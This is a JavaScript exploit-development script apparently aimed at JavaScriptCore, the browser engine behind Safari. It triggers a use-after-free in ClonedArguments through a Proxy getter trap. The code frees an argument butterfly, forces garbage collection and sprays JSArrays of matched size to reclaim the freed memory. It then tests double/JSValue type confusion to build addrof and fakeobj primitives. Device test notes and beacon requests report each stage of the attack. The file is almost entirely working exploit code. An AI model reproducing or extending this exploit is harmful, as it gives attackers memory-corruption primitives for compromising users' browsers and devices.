// p260 — ClonedArguments UAF with CORRECT butterfly reclaim
//
// Key findings from device testing:
// - V240/V241/V245: 64-element (520B) butterflies grow IN-PLACE = no UAF
// - V220: 16-element (136B) butterflies DO get non-in-place realloc = UAF works!
// - ArrayBuffer spray CAN'T reclaim MarkedSpace butterfly memory directly
// - JSArray butterfly spray (same aux space) is the correct approach
//
// Strategy:
// 1. Use 16-element ClonedArguments (136B butterfly, MarkedSpace cell ~144B)
// 2. Grow to 500 elements in Proxy trap (4008B → different size class → new alloc)
// 3. Force GC to sweep old 144B cell
// 4. Spray JSArrays with ~16 elements each (144B butterflies → same size class)
// 5. Stale data[] reads spray array values
//
// For addrof: spray with double-indexed arrays
// For fakeobj: interpret double spray bits as JSValues
//
// Beacon prefix: V260-

(function() {
  var BQ = 0;
  function B(tag, body) {
    var url = '/beacon/V260-' + tag + '?t=' + Date.now() + '&q=' + (BQ++);
    try {
      var x = new XMLHttpRequest();
      if (body && body.length < 1600) {
        x.open('GET', url + '&d=' + encodeURIComponent(body), true);
        x.send();
      } else {
        x.open('GET', url, true);
        x.send();
      }
    } catch(e) {}
  }

  function hex(v) { return ('00000000'+(v>>>0).toString(16)).slice(-8); }

  // Float64Array for double<->int64 conversion
  var convF = new Float64Array(1);
  var convU = new Uint32Array(convF.buffer);

  function f2i(f) {
    convF[0] = f;
    return { lo: convU[0], hi: convU[1] };
  }

  function i2f(lo, hi) {
    convU[0] = lo;
    convU[1] = hi;
    return convF[0];
  }

  B('BOOT');

  function target() { return arguments; }
  function receiver() { return Array.prototype.slice.call(arguments); }

  var NARGS = 16; // CRITICAL: small butterfly for non-in-place realloc
  var GROW_TO = 500; // Grow far past original → forces new alloc

  // =================================================================
  // ROUND A: Contiguous spray — confirm reclaim works
  // =================================================================
  try {
    B('RA-START');

    var vals = [];
    for (var i = 0; i < NARGS; i++) vals.push(0xAA0000 + i);
    var args = target.apply(null, vals);
    delete args[3]; // hole

    var sprayA = [];
    var trapA = 0;
    var handlerA = {
      get: function(t, prop) {
        if (++trapA > 1) return undefined;
        B('RA-TRAP');

        // Step 1: Grow → old butterfly freed (non-in-place realloc)
        for (var j = NARGS; j < GROW_TO; j++) args[j] = 0x41414141;
        B('RA-GREW');

        // Step 2: Force GC to sweep old butterfly cell
        for (var g = 0; g < 30; g++) {
          var p = [];
          for (var k = 0; k < 5000; k++) p.push({a: k});
          p = null;
        }
        B('RA-GC');

        // Step 3: Spray contiguous JSArrays with matching butterfly size
        // 16 elements → 8 + 16*8 = 136 bytes → same size class as old butterfly
        for (var s = 0; s < 8000; s++) {
          var a = [];
          for (var e = 0; e < NARGS; e++) {
            a.push(0xCAFE0000 + s * 100 + e);
          }
          sprayA.push(a);
        }
        B('RA-SPRAY-' + sprayA.length);

        return undefined;
      }
    };

    Object.setPrototypeOf(args, new Proxy({}, handlerA));
    var result = receiver.apply(null, args);
    B('RA-LEN-' + result.length);

    // Analyze
    var cafeHits = 0;
    var origHits = 0;
    var otherHits = 0;
    var rpt = [];
    for (var i = 0; i < Math.min(result.length, NARGS); i++) {
      if (i === 3) continue; // hole
      var v = result[i];
      if (typeof v !== 'number') { otherHits++; rpt.push(i+'='+typeof v); continue; }
      var u = v >>> 0;
      if ((u >>> 16) === 0xCAFE) {
        cafeHits++;
        if (cafeHits <= 5) rpt.push(i + '=C:' + hex(u));
      } else if (u === (0xAA0000 + i)) {
        origHits++;
      } else {
        otherHits++;
        rpt.push(i + '=O:' + hex(u));
      }
    }

    B('RA-CAFE-' + cafeHits + '-ORIG-' + origHits + '-OTHER-' + otherHits, rpt.join('|'));

    if (cafeHits > 0) {
      B('RA-RECLAIM-CONFIRMED');

      // Identify which spray array reclaimed
      var reclaimIdx = -1;
      for (var i = 0; i < Math.min(result.length, NARGS); i++) {
        if (i === 3) continue;
        var v = result[i];
        if (typeof v === 'number' && ((v >>> 0) >>> 16) === 0xCAFE) {
          var u = (v >>> 0) & 0xFFFF;
          var si = Math.floor(u / 100);
          if (si >= 0 && si < sprayA.length) {
            reclaimIdx = si;
            break;
          }
        }
      }
      B('RA-RECLAIM-IDX-' + reclaimIdx);
    } else {
      B('RA-NO-RECLAIM');
    }

    sprayA = null;
  } catch(e) {
    B('RA-ERR-' + e.message.substring(0, 40));
  }

  // =================================================================
  // ROUND B: Double spray — test type confusion for addrof/fakeobj
  // =================================================================
  try {
    B('RB-START');

    // Create a target object whose address we want
    var leakTarget = new ArrayBuffer(256);
    var leakView = new DataView(leakTarget);
    leakView.setUint32(0, 0xDEAD1337, true); // marker

    var vals2 = [];
    for (var i = 0; i < NARGS; i++) vals2.push(i === 2 ? leakTarget : (0xBB0000 + i));
    var args2 = target.apply(null, vals2);
    delete args2[5]; // hole at different index

    var sprayB = [];
    var trapB = 0;
    var handlerB = {
      get: function(t, prop) {
        if (++trapB > 1) return undefined;
        B('RB-TRAP');

        // Grow → free old butterfly
        for (var j = NARGS; j < GROW_TO; j++) args2[j] = 0x42424242;

        // GC pressure
        for (var g = 0; g < 30; g++) {
          var p = [];
          for (var k = 0; k < 5000; k++) p.push({b: k});
          p = null;
        }

        // Spray DOUBLE-indexed arrays
        // When stale contiguous read interprets double bits as JSValues:
        // - The raw double bytes become the JSValue encoding
        // - For doubles with specific bit patterns, this gives controlled behavior
        for (var s = 0; s < 8000; s++) {
          var a = [];
          for (var e = 0; e < NARGS; e++) {
            // Store doubles that encode to recognizable JSValue patterns
            // We want: when raw IEEE754 bits are read as a JSValue:
            // - Bits matching 0xFFFE0000_XXXXXXXX → int32 X
            // We use i2f to construct doubles with specific bit patterns
            //
            // Marker: int32 JSValue = 0xFFFE0000 | (0xD000 + s*16 + e)
            // = i2f(0xD000 + s*16 + e, 0xFFFE0000) as a double
            a.push(i2f((0xD0000000 + s * 256 + e) >>> 0, 0xFFFE0000));
          }
          sprayB.push(a);
        }
        B('RB-SPRAY-' + sprayB.length);

        return undefined;
      }
    };

    Object.setPrototypeOf(args2, new Proxy({}, handlerB));
    var result2 = receiver.apply(null, args2);
    B('RB-LEN-' + result2.length);

    // Analyze: we should see int32 values from the double spray
    var dHits = 0;
    var origHits2 = 0;
    var objHits = 0;
    var rpt2 = [];
    for (var i = 0; i < Math.min(result2.length, NARGS); i++) {
      if (i === 5) continue;
      var v = result2[i];

      if (i === 2) {
        // This slot had leakTarget (cell pointer)
        if (v === leakTarget) {
          rpt2.push('2=SAME-OBJ');
          origHits2++;
        } else if (typeof v === 'number') {
          // The pointer was overwritten by spray double → now interpreted as int32 or double
          var bits = f2i(v);
          rpt2.push('2=NUM:' + hex(bits.hi) + hex(bits.lo));
          dHits++;
        } else if (typeof v === 'object') {
          // A DIFFERENT object! Raw double bits looked like a cell pointer → fakeobj!
          rpt2.push('2=FAKEOBJ!');
          objHits++;
        } else {
          rpt2.push('2=' + typeof v);
        }
        continue;
      }

      if (typeof v === 'number') {
        var u = v >>> 0;
        if (u >= 0xD0000000 && u < 0xD0000000 + 8000 * 256 + NARGS) {
          // Our spray marker (read as int32)!
          dHits++;
          if (dHits <= 3) {
            var si = Math.floor((u - 0xD0000000) / 256);
            rpt2.push(i + '=D:s' + si);
          }
        } else if (u === (0xBB0000 + i)) {
          origHits2++;
        } else {
          // Some other value — could be from double encoding
          var bits2 = f2i(v);
          if (rpt2.length < 10) rpt2.push(i + '=V:' + hex(bits2.hi) + hex(bits2.lo));
        }
      } else if (typeof v === 'object') {
        objHits++;
        rpt2.push(i + '=OBJ');
      }
    }

    B('RB-D-' + dHits + '-ORIG-' + origHits2 + '-OBJ-' + objHits, rpt2.join('|'));

    if (dHits > 0) {
      B('RB-DOUBLE-CONFUSION-CONFIRMED');
    }
    if (objHits > 0) {
      B('RB-FAKEOBJ-HIT');
    }

    // === Check: can we find where leakTarget's address went? ===
    // If slot 2 returned a number, the pointer bytes were overwritten
    // by the spray double. The original pointer is lost.
    // But maybe we can use a NO-SPRAY UAF to preserve the pointer.

    sprayB = null;
  } catch(e) {
    B('RB-ERR-' + e.message.substring(0, 40));
  }

  // =================================================================
  // ROUND C: No-spray UAF — preserve original values
  // =================================================================
  try {
    B('RC-START');

    // Put target at index 2
    var vals3 = [];
    for (var i = 0; i < NARGS; i++) vals3.push(i === 2 ? leakTarget : (0xCC0000 + i));
    var args3 = target.apply(null, vals3);
    delete args3[7]; // hole

    var trapC = 0;
    var handlerC = {
      get: function(t, prop) {
        if (++trapC > 1) return undefined;
        B('RC-TRAP');

        // Grow → free old butterfly
        for (var j = NARGS; j < GROW_TO; j++) args3[j] = 0x43434343;

        // Light GC — just enough to mark the old butterfly as free
        for (var g = 0; g < 10; g++) {
          var p = [];
          for (var k = 0; k < 2000; k++) p.push({c: k});
          p = null;
        }
        B('RC-GC');

        // NO spray — let old data persist
        return undefined;
      }
    };

    Object.setPrototypeOf(args3, new Proxy({}, handlerC));
    var result3 = receiver.apply(null, args3);
    B('RC-LEN-' + result3.length);

    var changed = 0;
    var rpt3 = [];
    for (var i = 0; i < Math.min(result3.length, NARGS); i++) {
      if (i === 7) continue;
      var v = result3[i];

      if (i === 2) {
        if (v === leakTarget) {
          rpt3.push('2=SAME');
        } else if (typeof v === 'number') {
          changed++;
          var bits3 = f2i(v);
          rpt3.push('2=LEAK:' + hex(bits3.hi) + hex(bits3.lo));
          // This could be our target object's address + DoubleEncodeOffset
          // Or some random internal data that overwrote the slot
        } else if (typeof v === 'object' && v !== leakTarget) {
          changed++;
          rpt3.push('2=DIFF-OBJ');
        } else {
          rpt3.push('2=' + typeof v);
        }
        continue;
      }

      var exp = 0xCC0000 + i;
      if (typeof v !== 'number' || (v >>> 0) !== exp) {
        changed++;
        if (typeof v === 'number') {
          var bits4 = f2i(v);
          rpt3.push(i + '=C:' + hex(bits4.hi) + hex(bits4.lo));
        } else if (typeof v === 'object') {
          rpt3.push(i + '=OBJ');
        } else if (v === undefined) {
          rpt3.push(i + '=undef');
        } else {
          rpt3.push(i + '=' + typeof v);
        }
      }
    }

    B('RC-CHANGED-' + changed, rpt3.join('|'));
    if (changed === 0) {
      B('RC-INPLACE-REALLOC');
    } else {
      B('RC-STALE-DATA-FOUND');
    }
  } catch(e) {
    B('RC-ERR-' + e.message.substring(0, 40));
  }

  // =================================================================
  // ROUND D: Size class test — try 8 elements (72B butterfly)
  // =================================================================
  try {
    B('RD-START');

    var args4 = (function() {
      delete arguments[2];
      return arguments;
    })(0xDD01, 0xDD02, 0xDD03, 0xDD04, 0xDD05, 0xDD06, 0xDD07, 0xDD08);

    var sprayD = [];
    var trapD = 0;
    var handlerD = {
      get: function(t, prop) {
        if (++trapD > 1) return undefined;

        // Grow 8 → 500
        for (var j = 8; j < GROW_TO; j++) args4[j] = 0x44444444;

        // GC
        for (var g = 0; g < 30; g++) {
          var p = [];
          for (var k = 0; k < 5000; k++) p.push({d: k});
          p = null;
        }

        // Spray 8-element arrays
        for (var s = 0; s < 10000; s++) {
          var a = [];
          for (var e = 0; e < 8; e++) a.push(0xFACE0000 + s * 10 + e);
          sprayD.push(a);
        }
        B('RD-SPRAY-' + sprayD.length);
        return undefined;
      }
    };

    Object.setPrototypeOf(args4, new Proxy({}, handlerD));
    var result4 = receiver.apply(null, args4);
    B('RD-LEN-' + result4.length);

    var faceHits = 0;
    var origD = 0;
    var rpt4 = [];
    for (var i = 0; i < Math.min(result4.length, 8); i++) {
      if (i === 2) continue;
      var v = result4[i];
      if (typeof v !== 'number') { rpt4.push(i+'='+typeof v); continue; }
      var u = v >>> 0;
      if ((u >>> 16) === 0xFACE) {
        faceHits++;
        if (faceHits <= 3) rpt4.push(i+'=F:'+hex(u));
      } else if (u === (0xDD01 + i)) {
        origD++;
      } else {
        rpt4.push(i+'=X:'+hex(u));
      }
    }

    B('RD-FACE-' + faceHits + '-ORIG-' + origD, rpt4.join('|'));
    if (faceHits > 0) B('RD-RECLAIM-CONFIRMED');
    else if (origD >= 6) B('RD-INPLACE-REALLOC');

    sprayD = null;
  } catch(e) {
    B('RD-ERR-' + e.message.substring(0, 40));
  }

  B('DONE');
})();
